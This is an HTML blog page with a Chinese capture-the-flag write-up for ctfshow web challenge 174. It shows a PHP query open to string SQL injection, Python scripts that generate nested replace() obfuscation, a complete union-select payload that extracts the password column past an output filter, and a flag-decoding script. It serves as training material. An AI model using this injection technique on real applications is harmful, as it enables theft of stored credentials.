<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>ctfshow web入门174 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="ctfshow web入门174" />
<meta property="og:description" content="题目给出了查询语句和返回逻辑
先看查询语句
$sql = &#34;select username,password from ctfshow_user4 where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39; limit 1;&#34;; 这里能直接看出来是使用单引号进行绕过
是一个字符型注入
继续，查看返回逻辑
if(!preg_match(&#39;/flag|[0-9]/i&#39;, json_encode($ret))){ $ret[&#39;msg&#39;]=&#39;查询成功&#39;; } 这里如果返回数据中包含 `flag` 字样，或者包含数字0-9，则不会输出
这里的话有两种方法，第一种方法是盲注
这里不作介绍
这里介绍第二种更为取巧的方式
做字符替换
我们已知 flag 中只包含16进制数
也就是0-9 a-f
那么我们可以将 0替换为g
0-&gt;g
1-&gt;h
...
以此类推
好的，那么按照这个思路，要么写个脚本生成payload
要么自己一点一点手写
这里给出脚本
i = 0 s = f&#34;replace(password,{i},&#39;{chr(ord(str(i)) &#43; 55)}&#39;)&#34; for i in range(1,10): s = f&#34;replace({s},{i},&#39;{chr(ord(str(i)) &#43; 55)}&#39;)&#34; print(s) 如果需要脚本思路的话可以留言
我就再写一篇分享思路的
上面的代码需要python版本3.6以上
这种格式写起来代码运行效率高且看起来容易
这里再给一段低版本的代码
s = &#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/151326958174ba26f363e362741d6f9a/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-05-24T13:08:33+08:00" />
<meta property="article:modified_time" content="2023-05-24T13:08:33+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">ctfshow web入门174</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p><img alt="" height="804" src="https://images2.imgbox.com/23/e4/bK2h2hsJ_o.png" width="1200"></p> 
<p> </p> 
<p> </p> 
<p>题目给出了查询语句和返回逻辑</p> 
<p>先看查询语句</p> 
<pre>$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";</pre> 
<p>这里能直接看出来是使用单引号进行绕过</p> 
<p>是一个字符型注入</p> 
<hr> 
<p>继续，查看返回逻辑</p> 
<pre><code class="language-php">
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
      </code></pre> 
<p>这里如果返回数据中包含 `flag` 字样，或者包含数字0-9，则不会输出</p> 
<p>这里的话有两种方法，第一种方法是盲注</p> 
<p>这里不作介绍</p> 
<p>这里介绍第二种更为取巧的方式</p> 
<p>做字符替换</p> 
<p>我们已知 flag 中只包含16进制数</p> 
<p>也就是0-9 a-f</p> 
<p>那么我们可以将 0替换为g</p> 
<p>0-&gt;g</p> 
<p>1-&gt;h</p> 
<p>...</p> 
<p>以此类推</p> 
<hr> 
<p>好的，那么按照这个思路，要么写个脚本生成payload</p> 
<p>要么自己一点一点手写</p> 
<p>这里给出脚本</p> 
<pre><code class="language-python">i = 0
s = f"replace(password,{i},'{chr(ord(str(i)) + 55)}')"
for i in range(1,10):
    s = f"replace({s},{i},'{chr(ord(str(i)) + 55)}')"
print(s)</code></pre> 
<p>如果需要脚本思路的话可以留言</p> 
<p>我就再写一篇分享思路的</p> 
<p>上面的代码需要python版本3.6以上</p> 
<p>这种格式写起来代码运行效率高且看起来容易</p> 
<p>这里再给一段低版本的代码</p> 
<pre><code class="language-python">s = "replace(password,{},'{}')".format(i, chr(ord(str(i)) + 55))
for i in range(1, 10):
    s = "replace({},{},'{}')".format(s, i, chr(ord(str(i)) + 55))
print(s)</code></pre> 
<hr> 
<p>生成的payload长这样</p> 
<p>replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,0,'g'),1,'h'),2,'i'),3,'j'),4,'k'),5,'l'),6,'m'),7,'n'),8,'o'),9,'p')</p> 
<p></p> 
<p>然后我们把这个拼接到注入语句内</p> 
<p>' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,0,'g'),1,'h'),2,'i'),3,'j'),4,'k'),5,'l'),6,'m'),7,'n'),8,'o'),9,'p') from ctfshow_user4 -- qwe</p> 
<p><img alt="" height="625" src="https://images2.imgbox.com/83/dc/uwLq0CV5_o.png" width="1200"></p> 
<p></p> 
<hr> 
<p>最后，再把得到的flag复原</p> 
<pre><code class="language-python">flag = 'ctfshow{dibcehal-abdb-kkhj-pplb-fddaleiohcgk}'
for i in range(10):
    flag = flag.replace(chr(ord(str(i)) + 55), str(i))
    print(str(i), chr(ord(str(i)) + 55))
print(flag)
</code></pre> 
<p></p> 
<p>复原之后</p> 
<p><img alt="" height="44" src="https://images2.imgbox.com/cb/f2/yRaqZHYm_o.png" width="473"></p> 
<p>前缀 ctfshow 也被更改了</p> 
<p>这里手动改一下改回来即可</p> 
<p>因为flag每次打开环境都不一样</p> 
<p>所以这里flag我就直接发出来了，也不影响。</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/20fe1de0cd0dda84b13bb69b61563b24/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">初学者编写python用什么软件？</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/e6beec2e55f4eb032167be4eead99810/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">python实现将多张图片结合为一张图片的方法</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>